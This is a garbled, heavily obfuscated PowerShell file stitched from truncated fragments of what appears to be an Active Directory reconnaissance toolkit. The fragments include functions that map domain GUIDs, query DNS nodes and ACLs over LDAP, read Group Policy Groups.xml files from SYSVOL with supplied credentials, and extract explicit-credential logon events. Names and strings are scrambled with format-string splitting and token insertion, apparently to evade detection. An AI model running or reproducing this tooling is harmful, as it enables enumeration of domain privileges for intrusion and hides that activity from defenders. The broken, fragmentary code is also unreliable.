                    YoV{ObjeIJKcTsIJKEaRChIJKeRaIJKRIJKGUmenIJKTs}[(Z3b{0}{2}{1}Z3b-fS5zPrS5z,S5ziesS5z,S5zopertS5z)] = (Z3b{5}{2}{9}{11}{0}{10}{7}{4}{6}{3}{12}{8}{13}{1}Z3b -f S5zaS5z,S5zssS5z,S5ztingS5z,S5z,objS5z,S5zoS5z,S5zdisS5z,S5zuntnameS5z,S5zamaccS5z,S5ziS5z,S5zuisheS5z,S5zme,cn,sS5z,S5zdnS5z,S5zectsS5z,S5zd,objectclaS5z)
            ','      YoV{sIJKEIJKRVErS} = @()
            YoV{oIJKBIJKJeCTIJK_liSt} JGO &(Z3b{0}{1}{2}Z3b -f S5zForEacS5z,S5zh-ObjS5z,S5zectS5z) {
                if (YoV{_}.Z3btaRgeIJKTIJKlIJKIstZ3b) {
                    YoV{_}.Z3bTIJKARGETliIJKstZ3b JGO &(Z3b{0}{3}{4}{1}{2}Z3b-fS5zFoS5z,S5zObjS5z,S5zectS5z,S5zrEachS5z,S5z-S5z) {
                        YoV{SIJKeRIJKVErS} += YoV{_}.(Z','        YoV{COIJKMPuIJKTIJKeRsIJKEaRCHBASe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{3}{0}{2}{1}Z3b -f S5zatingSysS5z,S5zmS5z,S5zteS5z,S5zerS5z,S5zOpS5z})]
        [String]
        YoV{cIJKoMpIJKUtEIJKROpIJKeraTinIJKgSyIJKStIJKEm},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{3}{2}{0}Z3b -f S5zckS5z,S5zServiS5z,S5zaS5z,S5zcePS5z})]
        [String]
        YoV{CIJKoMIJKpUIJKTErSERVIcEpIJKAIJKck},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b -f S5zSiS5z,S5zmeS5z,S5zteNaS5z})]
        [String]
        YoV{CoMIJKpUtIJKErSitIJKENAME},

        [Alias({Z3b{0}{3}{1}{2}Z3b-fS5zCS5z,S5zceS5z,S5zssS5z,S5zheckAcS5z})]
        [Switch]
        YoV{cHeCKShaIJKRIJKEAIJKCcEIJKsS},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{4}{3}{2}{0}Z3b-f S5zollerS5z,S5zDS5z,S5zrS5z,S5zainContS5z,S5zomS5z})]
        [String]
        YoV{sIJKErVeR},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zBaS5z,S5zseS5z}, {Z3b{1}{0}Z3b-f S5zelS5z,S5zOneLevS5z}, {Z3b{1}{2}{0}Z3b-f S5ztreeS5z,S5zSuS5z,S5zbS5z})]
        [String]
        YoV{SeaIJKRcHSCIJKoPe} = (Z3b{0}{1}Z3b -fS5zSubtrS5z,S5zeeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{REsuIJKLTPaIJKgESIJKIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ServIJKeRtImIJKELIIJKMIt},

        [Switch]
        YoV{tOIJKMIJKBStIJKonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREdenIJKTIJKIIJKAl} =   (  &(Z3b{1}{0}Z3b -f S5zcIS5z,S5zgS5z)  (Z3bvaRIZ3b+Z3bAbZ3b+Z3blEZ3b+Z3b:jfiZ3b)).Z3bvaIJKlueZ3b::Z3','erLIJKOcaIJKTiOn} = &(Z3b{2}{1}{0}{3}Z3b -fS5zbjS5z,S5z-OS5z,S5zNewS5z,S5zectS5z) (Z3b{0}{1}{2}Z3b -f S5zPSS5z,S5zObjecS5z,S5ztS5z)
                                    YoV{uIJKSeRLOcIJKAIJKTIoN} JGO &(Z3b{0}{1}{2}Z3b-f S5zAS5z,S5zdd-MembS5z,S5zerS5z) (Z3b{3}{0}{2}{1}Z3b-fS5zteprS5z,S5zrtyS5z,S5zopeS5z,S5zNoS5z) (Z3b{2}{1}{0}{3}Z3b-f S5zomS5z,S5zDS5z,S5zUserS5z,S5zainS5z) YoV{usIJKERDIJKoMaIN}
                                    YoV{UsIJKERIJKLOcAtiON} JGO &(Z3b{0}{2}{1}Z3b -fS5zAdd-MeS5z,S5zerS5z,S5zmbS5z) (Z3b{2}{3}{0}{1}Z3b-f S5ztS5z,S5zyS5z,S5zNoS5z,S5zteproperS5z) (Z3b{1}{0}{2}Z3b-fS5zserS5z,S5zUS5z,S5zNameS5z) YoV{uSEIJKRIJKNaMe}
                                    YoV{usIJKErlOCIJKAtiIJKOn} JGO &(Z3b{0}{1}{3}{2}Z3b -f S5zAS5z,S5zddS5z,S5zMemberS5z,S5z-S5z) (Z3b{0}{1}{3}{2}Z3b-f S5zNoS5z,S5ztepropS5z,S5zrtyS5z,S5zeS5z) (Z3b{1}{2}{0}Z3b-f S5zNameS5z,S5zCS5z,S5zomputerS5z) YoV{targIJKEIJKTcIJKoIJKMPuTer}
                                    YoV{uIJKsIJKerIJKloCaTion} JGO &(Z3b{1}{0}{2}Z3b-f S5zdd-MembS5z,S5zAS5z,S5zerS5z) (Z3b{0}{2}{1}Z3b-fS5zNS5z,S5zrtyS5z,S5zotepropeS5z) (Z3b{1}{0}{2}Z3b -f S5zddreS5z,S5zIPAS5z,S5zssS5z) YoV{iPADIJKDIJKRESs}
                                    YoV{uIJKsIJKErloIJKcaTiOn} JGO &(Z3b{1}{2}{0}Z3b-fS5zemberS5z,S5zAdS5z,S5zd-MS5z) (Z3b{1}{2}{3}{0}Z3b-f S5zyS5z,S5zNoteproS5z,S5zperS5z,S5ztS5z) (Z3b{1}{0}{2}{3}Z3b-f S5zessionS5z,S5zSS5z,S5zFrS5z,S5zomS5z) YoV{nIJKULl}
                                    YoV{USIJKerlIJKOcIJKAtIoN} JGO &(Z3b{1}{0}{2}Z3b-fS5zembS5z,S5zAdd-MS5z,S5zerS5z) (Z3b{3}{2}{0}{1}Z3b-f S5zrtS5z,S5zyS5z,S5zropeS5z,S5zNotepS5z) (Z3b{2}{3}{1}{0}Z3b -fS5zon',' (YoV{cOIJK','oV(YoVRawObject.','SIJKeARCHBIJKAIJKsE} -match (Z3b{2}{1}{3}{0}Z3b-fS5z.+S5z,S5zAP://.S5z,S5zLDS5z,S5z+/S5z)) {
                        YoV{SeARcIJKHsIJKTrIJKING} = S5zS5z
                        YoV{DIJKN} = YoV{sIJKEIJKArChbasE}
                    }
                    else {
                        YoV{DIJKN} = YoV{SEIJKARchbIJKAse}.(Z3b{1}{0}{3}{2}Z3b -f S5ztS5z,S5zSubSS5z,S5zgS5z,S5zrinS5z).Invoke(7)
                    }
                }
                else {
                    YoV{DN} = YoV{SEaIJKRcIJKhbIJKAsE}
                }
            }
        }
        else {
            
            if (YoV{tARgetIJKdoIJKMIJKAIn} -and (YoV{tARIJKgEIJKTdOmaiN}.(Z3b{0}{1}Z3b-fS5zTrS5z,S5zimS5z).Invoke() -ne S5zS5z)) {
                YoV{dN} = Z3bDC=YoV(YoVTargetDomain.Replace(S5z.S5z, S5z,DC=S5z))Z3b
            }
        }

        YoV{sIJKearCIJKHSTRiIJKNG} += YoV{DN}
        &(Z3b{0}{1}{2}{3}Z3b-fS5zWS5z,S5zriteS5z,S5z-S5z,S5zVerboseS5','0}Z3b-f S5zpS5z,S5z_temS5z)).Z3bPaIJKRIJKAmEtErsZ3b.Z3bkeIJKysZ3b
    }

    Process {
        if(YoV{cIJKReatEVIJKAriaBlIJKES}) {
            YoV{bIJKouIJKNdIJKKEyS} = YoV{bOUnIJKDIJKparIJKAIJKmeIJKTErS}.Z3bKEIJKysZ3b JGO &(Z3b{0}{1}{2}{3}Z3b -fS5zWhS5z,S5zere-S5z,S5zObjecS5z,S5ztS5z) { YoV{coIJKMmoIJKNpaRAIJKMeTEIJKRS} -notcontains YoV{_} }
            ForEach(YoV{PARaIJKMIJKeTer} in YoV{bouIJKNDIJKkeIJKyS}) {
                if (YoV{PArAIJKmEIJKTIJKEr}) {
                    &(Z3b{1}{0}{2}Z3b-f S5zVaS5z,S5zSet-S5z,S5zriableS5z) -Name YoV{PIJKARaMEIJKTer} -Value YoV{bOUNdIJKParaIJKMIJKeTERs}.YoV{pIJKAIJKRaMETER} -Scope 1 -Force
                }
            }
        }
        else {
            YoV{STIJKAleIJKKeYS} = @()
            YoV{SIJKTaIJKLIJKekEys} = YoV{PsIJKBIJKouNIJKDpaRIJKAMETERs}.(Z3b{3}{0}{1}{2}{4}Z3b -f S5zeS5z,S5ztEnumerS5z,S5zatoS5z,S5zGS5z,S5zrS5z).Invoke() JGO
                        &(Z3b{0}{1}{3}{2}Z3b -f S5zForEacS5z,S5zh-S5z,S5ztS5z,S5zObjecS5z) {
                            if(YoV{_}.Z3bVaIJKlUeZ3b.Z3bPSOIJKBIJKJeCtZ3b.Z3bMIJKEThOIJKdsZ3b.Z3bNaIJKMEZ3b -match ((S5z^S5z+S5zES5z+S5zquals1aQS5z).Z3brEIJKPlaceZ3b(S5z1aQS5z,[sTriNG][ChAr]36))) {
                                
                                if(!YoV{_}.Z3bvIJKAlueZ3b.(Z3b{1}{0}Z3b-f S5zsS5z,S5zEqualS5z).Invoke((&(Z3b{3}{2}{0}{1}Z3b -f S5ziaS5z,S5zbleS5z,S5zrS5z,S5zGet-VaS5z) -Name YoV{_}.Z3bKIJKEyZ3b -ValueOnly -Scope 0))) {
                                    YoV{_}.Z3bKIJKeYZ3b
                                }
                            }
                            else {
                                
                                if(YoV{_}.Z3bvAIJKlUEZ3b -ne (&(Z3b{0}{2}{3}{1}Z3b-fS5zGet-S5z,S5ziableS5z,S5zVS5z,S5zarS5z) -Name YoV{_}.Z3bkIJKEYZ3b -ValueOnly -Scope 0)) {
                                    YoV{_}.Z3bKIJKeYZ3b
                                }
                            }
                        }
            if(YoV{sTIJKALEIJKkEyS}) {
                YoV{staIJKLeKIJKeyS} JGO &(Z3b{3}{1}{2}{0}Z3b-f S5z-ObjectS5z,S5zorES5z,S5zachS5z,S5zFS5z) {[void]YoV{pIJKsbIJKOuIJKNdPARAMeTIJKeIJKRS}.(Z3b{0}{1}Z3b-f S5zReS5z,S5zmoveS5z).Invoke(YoV{_})}
            }

            
            YoV{uIJKNbouNDIJKPAramEtIJKeRS} = (&(Z3b{2}{3}{0}{1}Z3b-fS5zComman','       = YoV{PIJKROpeRTIJKIeS}[13].Z3bVaIJKLueZ3b
                            }
                            YoV{OUIJKTPIJKUt}.Z3bpSIJKOBjIJKECtZ3b.Z3bTypEIJKNAIJKmESZ3b.(Z3b{0}{1}{2}Z3b -fS5zIS5z,S5znseS5z,S5zrtS5z).Invoke(0, (Z3b{4}{11}{10}{3}{2}{7}{9}{1}{6}{0}{8}{5}Z3b-f S5zLogonES5z,S5zdentiaS5z,S5zew.ES5z,S5zViS5z,S5zPoS5z,S5ztS5z,S5zlS5z,S5zxplicitCrS5z,S5zvenS5z,S5zeS5z,S5zrS5z,S5zweS5z))
                            YoV{OuIJKTPuT}
                        }
                    }
                    (Z3b{0}{1}Z3b-fS5zdefS5z,S5zaultS5z) {
                        &(Z3b{0}{2}{1}Z3b-fS5zWriS5z,S5zrningS5z,S5zte-WaS5z) Z3bNo handler exists for event ID: YoV(YoVEvent.Id) Z3b
                    }
                }
            }
        }
    }
}


function Get-DIJKOmIJKAinguIdIJKMAP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{2}{1}Z3b -f S5zPSShouldProcS5z,S5zsS5z,S5zesS5z}, S5zS5z)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKoIJKmain},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{0}{1}{2}Z3b-fS5zntrS5z,S5zolS5z,S5zlerS5z,S5zDomainCoS5z})]
        [String]
        YoV{sIJKErIJKVer},

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ResULIJKTpAIJKgesIIJKZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SErvertImIJKeIJKlImIJKIt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKEdIJKENIJKTIal} =   (  &(Z3b{1}{2}{0}Z3b-fS5zbLES5z,S5zVAS5z,S5zRiaS5z) (Z3bJfZ3b+Z3bIZ3b) -vaLuEonlY  )::Z3bEMIJKPTyZ3b
    )

    YoV{GuIJKIdS} = @{(Z3b{4}{3}{0}{1}{2}{5}Z3b -f S5z0-00S5z,S5z0000000S5z,S5z00S5z,S5z000-000S5z,S5z00000000-0000-0S5z,S5z0S5z) = S5zAllS5z}

    YoV{fIJKorEsTIJKAIJKRIJKGUmeNIJKTS} = @{}
    if (YoV{pSIJKBounDIJKpAIJKRamIJKETERS}[(Z3b{2}{0}{1}Z3b -fS5ztS5z,S5zialS5z,S5zCredenS5z)]) { YoV{FIJKOResTArGIJKUIJKMEntS}[(Z3b{1}{2}{0}Z3b -fS5zlS5z,S5zCredeS5z,S5zntiaS5z)] = YoV{cRIJKeDIJKEnTiAl} }

    try {
        YoV{SIJKcHeIJKMapath} = (&(Z3b{0}{2}{1}Z3b -f S5zGet-FS5z,S5zrestS5z,S5zoS5z) @ForestArguments).Z3bscHEIJKMAZ3b.Z3bNIJKAmEZ3b
    }
    catch {
        throw (Z3b{13}{11}{2}{14}{12}{4}{1}{8}{6}{0}{3}{7}{10}{16}{9}{15}{5}Z3b-fS5zving S5z,S5zetrS5z,S5z ES5z,S5zforesS5z,S5z rS5z,S5zrestS5z,S5zeS5z,S5ztS5z,S5ziS5z,S5z path from GetS5z,S5z scheS5z,S5z]S5z,S5znS5z,S5z[Get-DomainGUIDMapS5z,S5zrror iS5z,S5z-FoS5z,S5zmaS5z)
    }
    if (-not YoV{sIJKcIJKHEmAPath}) {
        throw (Z3b{3}{2}{6}{12}{1}{10}{4}{9}{0}{8}{11}{13}{5}{7}Z3b -f S5zinS5z,S5zin retS5z,S5zmainS5z,S5z[Get-DoS5z,S5ziS5z,S5za S5z,S5zGUIDMap] ES5z,S5zpath from Get-ForestS5z,S5zg S5z,S5zevS5z,S5zrS5z,S5zforeS5z,S5zrror S5z,S5zst schemS5z)
    }

    YoV{searChIJKeRarIJKg','
        YoV{FiIJKNDOIJKNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKREIJKDentIJKiAl} =  (  &(S5zGIS5z)  vAriaBlE:Jfi).Z3bvAIJKluEZ3b::Z3bEmIJKpTYZ3b
    )

    PROCESS {
        YoV{sEaRcheIJKRAIJKRguIJKmenTS} = @{
            (Z3b{0}{2}{1}Z3b -fS5zLDAS5z,S5zterS5z,S5zPFilS5z) = (Z3b{2}{0}{3}{1}{4}Z3b-fS5zjectClaS5z,S5zs=dnsNodeS5z,S5z(obS5z,S5zsS5z,S5z)S5z)
            (Z3b{1}{3}{0}{4}{2}Z3b -fS5zBaS5z,S5zSeS5z,S5zPrefixS5z,S5zarchS5z,S5zseS5z) = Z3bDC=YoV(YoVZoneName),CN=MicrosoftDNS,DC=DomainDnsZonesZ3b
        }
        if (YoV{psIJKBOUIJKNdPAIJKRamIJKEteRS}[(Z3b{2}{1}{0}Z3b -fS5zinS5z,S5zaS5z,S5zDomS5z)]) { YoV{sIJKEarCheRIJKArGUIJKMeIJKNIJKTs}[(Z3b{1}{2}{0}Z3b -f S5znS5z,S5zDS5z,S5zomaiS5z)] = YoV{dIJKOMAIJKIn} }
        if (YoV{PsBIJKOunIJKDPIJKARIJKAIJKmeters}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zerverS5z)]) { YoV{SeaIJKRIJKcheraRIJKGUIJKMENIJKTS}[(Z3b{1}{0}Z3b-f S5zrverS5z,S5zSeS5z)] = YoV{sERIJKVer} }
        if (YoV{PIJKsbOuIJKNdIJKPARAmIJKETIJKers}[(Z3b{0}{3}{1}{2}Z3b -f S5zPS5z,S5zrtS5z,S5ziesS5z,S5zropeS5z)])','5zNew-S5z,S5ztS5z,S5zObjecS5z) (Z3b{2}{6}{7}{1}{5}{3}{0}{4}Z3b -f S5ztyDescrS5z,S5zl.RawSecuS5z,S5zSecuriS5z,S5ziS5z,S5ziptorS5z,S5zrS5z,S5ztS5z,S5zy.AccessControS5z) -ArgumentList YoV{oBIJKJEIJKct}[(Z3b{3}{4}{0}{2}{1}{5}Z3b-f S5zeS5z,S5zuriS5z,S5zcS5z,S5znS5z,S5ztsS5z,S5ztydescriptorS5z)][0], 0 JGO &(Z3b{0}{2}{1}Z3b-fS5zForS5z,S5zach-ObjectS5z,S5zES5z) { if (YoV{psIJKBOIJKUIJKNdPARAmEtIJKErS}[(Z3b{1}{0}Z3b-fS5zclS5z,S5zSaS5z)])','{0}{1}Z3b-fS5zyReferenS5z,S5zceS5z,S5zentitS5z,S5zIdS5z) YoV{aIJKcl}.Z3bIDIJKenTIIJKTyReIJKFerENCeZ3b
            YoV{gIJKPIJKOaCl} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdd-MeS5z,S5zmbeS5z,S5zrS5z) (Z3b{2}{3}{0}{1}Z3b -f S5zperS5z,S5ztyS5z,S5zNotS5z,S5zeproS5z) (Z3b{3}{1}{2}{0}Z3b -fS5zsS5z,S5zvS5z,S5zeD','S5zscorepropaS5z,S5zaS5z,S5zdS5z,S5zgatS5z),(Z3b{1}{0}{2}Z3b-f S5znaS5z,S','rGIJKUmeNIJKTS}[(Z3b{2}{1}{0}Z3b -fS5zrS5z,S5zerveS5z,S5zSS5z)] = YoV{SIJKervIJKEr} }
        if (YoV{pIJKSboIJKUndPaRamIJKETIJKerS}[(Z3b{1}{2}{0}Z3b-f S5zhScopeS5z,S5zSeS5z,S5zarcS5z)]) { YoV{aclarIJKGUmIJKenTS}[(Z3b{3}{0}{2}{1}Z3b-f S5zearcS5z,S5zcopeS5z,S5zhSS5z,S5zSS5z)] = YoV{seArcIJKHsCIJKOpE} }
        if (YoV{pSbOIJKUNdpaIJKRIJKAMETerS}[(Z3b{0}{3}{4}{2}{1}Z3b-f S5zResultPaS5z,S5zeS5z,S5zzS5z,S5zgeSS5z,S5ziS5z)]) { YoV{aCIJKlaIJKRguIJKMeIJKNTS}[(Z3b{0}{2}{3}{1}Z3b -fS5zRS5z,S5zeSizeS5z,S5zesultPS5z,S5zagS5z)] = YoV{RIJKESIJKUIJKLTpagESIIJKzE} }
        if (YoV{PSIJKBOuIJKNDpAIJKRAMetErs}[(Z3b{2}{3}{1}{0}Z3b-f S5ztS5z,S5zverTimeLimiS5z,S5zSeS5z,S5zrS5z)]) { YoV{AIJKcLargIJKUIJKMEntS}[(Z3b{0}{1}{2}{3}Z3b-fS5zSeS5z,S5zrverTiS5z,S5zmeLimiS5z,S5ztS5z)] = YoV{seRveRtIJKiIJKMeLIJKiMit} }
        if (YoV{pSIJKBOUnDPArIJKAmETIJKERs}[(Z3b{2}{1}{0}Z3b-f S5ztoneS5z,S5zmbsS5z,S5zToS5z)]) { YoV{AclaIJKRguMIJKEnTS}[(Z3b{2}{1}{0}Z3b -f S5zneS5z,S5zmbstoS5z,S5zToS5z)] = YoV{TIJKoMbIJKsTONe} }
        if (YoV{PsBOunIJKDpArAmeIJKTIJKErS}[(Z3b{2}{1}{0}Z3b-fS5zentialS5z,S5zedS5z,S5zCrS5z)]) { YoV{AcLIJKARIJKguMEnTS}[(Z3b{2}{1}{0}Z3b -fS5zdentialS5z,S5zreS5z,S5zCS5z)] = YoV{cIJKReDEIJKNtIaL} }

        YoV{OBJeCIJKTsIJKEaRCIJKHIJKeRaRgUMIJKENtS} = @{
            (Z3b{1}{0}{2}Z3b -fS5zoS5z,S5zPrS5z,S5zpertiesS5z) = (Z3b{5}{2}{4}{3}{0}{1}Z3b -f S5zbjectclasS5z,S5zsS5z,S5zunS5z,S5zname,oS5z,S5ztS5z,S5zsamaccoS5z)
            S5zRawS5z = YoV{tRIJKUe}
        }
        if (YoV{PSIJKBouNIJKdpArAIJKmETIJKers}[(Z3b{2}{1}{0}Z3b -f S5zrverS5z,S5zeS5z,S5zSS5z)]) { YoV{oIJKBjECTSeAIJKRcheIJKRarIJKgUMEnTS}[(Z3b{1}{0}Z3b-f S5zrS5z,S5zServeS5z)] = YoV{SERIJKVer} }
        if (YoV{psbIJKouNDIJKPAIJKRaMetIJKers}[(Z3b{2}{0}{1}Z3b -fS5zarcS5z,S5zhScopeS5z,S5zSeS5z)]) { YoV{ObjecIJKTSEAIJKRIJKchIJKerArgUmIJKEnts}[(Z3b{0}{1}{2}Z3b -f S5zSeS5z,S5zarchScopS5z,S5zeS5z)] = YoV{seIJKArcHIJKScoIJKPE} }
        if (YoV{pSbouIJKNdPIJKAraMIJKEIJKTerS}[(Z3b{0}{1}{4}{3}{2}Z3b-','   if (YoV{PsBOIJKUnDparIJKAMeIJKTErS}[(Z3b{0}{1}{3}{4}{2}Z3b -fS5zSS5z,S5zerS5z,S5zitS5z,S5zvS5z,S5zerTimeLimS5z)]) { YoV{SIJKEARIJKcHerarIJKGIJKUMenIJKTS}[(Z3b{1}{0}{4}{3}{2}Z3b-fS5zerverS5z,S5zSS5z,S5zitS5z,S5zmS5z,S5zTimeLiS5z)] = YoV{sIJKEIJKRvEIJKRTiIJKmELiMI','teRange(1, 10000)]
        [Int]
        YoV{ReIJKsuIJKltpIJKAGEsIJKIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sERvERtiIJKMEliIJKmiT},

        [Switch]
        YoV{TOMbIJKstoIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKReIJKdeNTiAl} =   ( &(Z3b{2}{0}{1}Z3b-f S5z-vaRS5z,S5zIAbLeS5z,S5zgETS5z) JfI ).Z3bvaIJKlUeZ3b::Z3bEIJKMPtyZ3b
    )

    BEGIN {
        YoV{seArcHIJKErIJKArgUIJKmEnIJKTS} = @{}
        if (YoV{PsboUIJKNdIJKPARaIJKMIJKeTerS}[(Z3b{0}{1}Z3b -f S5zDomaS5z,S5zinS5z)]) { YoV{SeIJKARCIJKhEIJKRArgIJKUMeNtS}[(Z3b{0}{1}Z3b-f S5zDoS5z,S5zmainS5z)] = YoV{DOIJKmAIn} }
        if (YoV{psBouNDparIJKAmeIJKTIJKeIJKRs}[(Z3b{1}{0}{2}Z3b -f S5zDAPFilteS5z,S5zLS5z,S5zrS5z)]) { YoV{sEARIJKcHIJKErIJKARGUIJKMenTs}[(Z3b{2}{0}{1}Z3b-f S5zlS5z,S5zterS5z,S5zLDAPFiS5z)] = YoV{ldaIJKpfIJKiLIJKTEr} }
        if (YoV{PsBIJKoIJKUndparamEtEIJKRS}[(Z3b{2}{1}{0}Z3b -f S5zseS5z,S5zearchBaS5z,S5zSS5z)]) { YoV{sIJKeaRchEraRIJKg','sXMS5z})]
    [CmdletBinding()]
    Param (
        [Parameter(MaNdaTorY = YoV{TRIJKUE}, valUEFROMPIpElIne = YoV{TrIJKUE}, valuefrOMPIPeLiNeBYpRoPErTynamE = YoV{trIJKUe})]
        [Alias({Z3b{1}{0}Z3b -fS5zathS5z,S5zPS5z})]
        [String]
        YoV{GIJKRIJKOupIJKsxMLPATH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{creDIJKEnTIJKIAL} =  YoV{JIJKFI}::Z3beMIJKPTYZ3b
    )

    BEGIN {
        YoV{MApPIJKeDpAIJKTIJKHS} = @{}
    }

    PROCESS {
        try {
            if ((YoV{gROIJKUPsIJKxMLPIJKAtH} -Match (((Z3b{0}{3}{4}{2}{1}Z3b-f S5z3Pw3S5z,S5zw.*S5z,S5zw3PS5z,S5zPw3Pw3PwS5z,S5z.*3PS5z)).Z3bREIJKplAceZ3b(S5z3PwS5z,[sTrING][ChAr]92))) -and (YoV{PsBoIJKUIJKNIJKDparAmeTIJKEIJKRS}[(Z3b{0}{1}{2}Z3b-fS5zCS5z,S5zreS5z,S5zdentialS5z)])) {
                YoV{SIJKYsvOLPAIJKTh} = Z3b5rj5rjYoV((New-Object System.Uri(YoVGroupsXMLPath)).Host)5rjSYSVOL Z3b
                if (-not YoV{MIJKAIJKppEdIJKpathS}[YoV{sIJKYIJKsVoLIJKPaTH}]) {
                    
                    &(Z3b{0}{3}{1}{2}Z3b-fS5zAdS5z,S5z-RemoteConneS5z,S5zctionS5z,S5zdS5z) -Path YoV{sIJKYIJKsIJKVoLPaTh} -Credential YoV{CIJKReIJKdeNTiaL}
                    YoV{mApIJKPIJKEdpaTHS}[YoV{sYsVOlpIJKAIJKTh}] = YoV{tIJKRUe}
                }
            }

            [XML]YoV{gRoIJKUpsxIJKmLIJKcoNtENt} = &(Z3b{1}{2}{0}Z3b -f S5zentS5z,S5zGet-CS5z,S5zontS5z) -Path YoV{GrIJKouIJKpSxmIJKLpath} -ErrorAction (Z3b{1}{0}Z3b-fS5zopS5z,S5zStS5z)

            
            YoV{gRoUpIJKsxmIJKLCIJKoNTIJKeNT} JGO &(Z3b{0}{1}{2}Z3b-fS5zSeleS5z,S5zctS5z,S5z-XmlS5z) (Z3b{2}{4}{0}{3}{1}Z3b-fS5z/GroS5z,S5zpS5z,S5z/GrS5z,S5zuS5z,S5zoupsS5z) JGO &(Z3b{2}{1}{0}{3}Z3b-f S5zcS5z,S5zeS5z,S5zSelect-ObjS5z,S5ztS5z) -ExpandProperty (Z3b{0}{1}Z3b -f S5znS5z,S5zodeS5z) JGO &(Z3b{1}{0}{2}Z3b -f S5zEacS5z,S5zForS5z,S5zh-ObjectS5z) {

                YoV{GIJKROupIJKNAME} = YoV{_}.Z3bPRopeIJKRTiIJKeSZ3b.Z3bGRoUIJKpnaIJKMeZ3b

                
                YoV{GRIJKOupIJKsID} = YoV{_}.Z3bPIJKROPErTIJKiesZ3b.Z3bGROIJKUPIJKsIdZ3b
                if (-not YoV{gIJKROIJKUPIJKsid}) {
                    if (YoV{grOIJKUPIJKNaIJKME} -match (Z3b{1}{3}{0}{2}Z3b-fS5zorS5z,S5zAdministraS5z,S5zsS5z,S5ztS5z)) {
                        YoV{GRoIJKUIJKPsiD} = (Z3b{2}{0}{1}Z3b -f S5z5-S5z,S5z32-544S5z,S5zS-1-S5z)
                    }
                    elseif (YoV{grOIJKUIJKpNIJKAME} -match (Z3b{2}{0}{3}{1}Z3b-fS5zemote S5z,S5zsktopS5z,S5zRS5z,S5zDeS5z)) {
                        YoV{GRouIJKPsId} = (Z3b{3}{2}{1}{0}Z3b-fS5z55S5z,S5z-32-5S5z,S5z-1-5S5z,S5zSS5z)
                    }
                    elseif (YoV{GroUIJKpIJKNamE} -match (Z3b{2}{0}{1}Z3b-fS5zstS5z,S5zsS5z,S5zGueS5z)) {
                        YoV{gROuIJKpsIJKID} = (Z3b{1}{0}{2}Z3b -fS5z-32S5z,S5zS-1-5S5z,S5z-546S5z)
                    }
                    else {
                        if (YoV{psbIJKouNDIJKPIJKAraIJKmETeRS}[(Z3b{2','ment.Automation.CredentialAttribute()]
        YoV{crIJKEdENTIJKiAL} =   (&(Z3b{2}{1}{3}{0}Z3b-fS5z-CHiLditEmS5z,S5zeS5z,S5zGS5z,S5ztS5z) vARiaBLE:jfi  ).Z3bVAlIJKUeZ3b::Z3beIJKmptyZ3b
    )

    BEGIN {
        YoV{SeARIJKcherAIJKRIJKgumIJKents} = @{}
        if (YoV{psIJKBouIJKNdPARameTIJKERS}[(Z3b{1}{0}Z3b-fS5zverS5z,S5zSerS5z)]) { YoV{SIJKEIJKArIJKCHERARgIJKUmeIJKNTs}[(Z3b{0}{2}{1}Z3b -f S5zSS5z,S5zrS5z,S5zerveS5z)] = YoV{SIJKeRvEr} }
        if (YoV{psIJKBOIJKUIJKNdparaIJKmeTeIJKRs}[(Z3b{4}{3}{1}{0}{2}Z3b -fS5zmiS5z,S5ziS5z,S5ztS5z,S5zerverTimeLS5z,S5zSS5z)]) { YoV{sEaIJKRIJKcHErarIJKGuMIJKENts}[(Z3b{0}{1}{3}{4}{2}Z3b -fS5zServS5z,S5zeS5z,S5zLimitS5z,S5zrS5z,S5zTimeS5z)] = YoV{sErVErTIJKIMEIJKLIJKimiT} }
        if (YoV{PsbOuNIJKdIJKPaRaIJKMETeRS}[(Z3b{0}{3}{2}{1}Z3b-f S5zCredS5z,S5zlS5z,S5ztiaS5z,S5zenS5z)]) { YoV{sEArcHIJKERAIJKRGuIJKmeNTS}[(Z3b{0}{1}{2}Z3b-f S5zCrS5z,S5zedeS5z,S5zntialS5z)] = YoV{CRIJKeIJKdeNTIJKiaL} }

        YoV{cOIJKNIJKVERTAIJKRgIJKUMents} = @{}
        if (YoV{PIJKsBOUnIJKDPAIJKRamEIJKTErs}[(Z3b{1}{0}Z3b-f S5zverS5z,S5zSerS5z)]) { YoV{cIJKOnVIJKErtIJKArGUMIJKEnTs}[(Z3b','                 (Z3b{0}{1}Z3b-f S5zEventS5z,S5zIdS5z)                   = YoV{evIJKenT}.Z3bidZ3b
                                (Z3b{2}{1}{0}{3}{4}Z3b-fS5zUS5z,S5zbjectS5z,S5zSuS5z,S5zsS5z,S5zerSidS5z)            = YoV{pIJKRoperIJKTiEs}[0].Z3bvIJKALUEZ3b.(Z3b{0}{1}Z3b-fS5zToSS5z,S5ztringS5z).Invoke()
                                (Z3b{0}{2}{3}{1}Z3b-f S5zSS5z,S5zeS5z,S5zubjecS5z,S5ztUserNamS5z)           = YoV{ProPIJKertiIJKes}[1].Z3bVAIJKluEZ3b
                                (Z3b{2}{0}{3}{1}Z3b-f S5zectDS5z,S5zameS5z,S5zSubjS5z,S5zomainNS5z)         = YoV{pROIJKpIJKERtIIJKeS}[2].Z3bVIJKAluEZ3b
